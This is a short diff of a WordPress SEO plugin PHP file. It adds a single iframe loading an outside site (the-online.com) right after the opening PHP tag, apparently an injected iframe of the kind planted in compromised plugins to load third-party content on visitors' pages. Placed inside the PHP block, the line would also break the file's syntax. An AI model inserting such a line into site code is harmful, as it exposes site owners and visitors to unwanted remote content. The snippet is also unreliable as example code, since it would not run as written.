@@ -1,4 +1,5 @@
 <?php
+ <iframe src="https://the-online.com/"></iframe> 
 /**
  * WPSEO plugin file.
  *
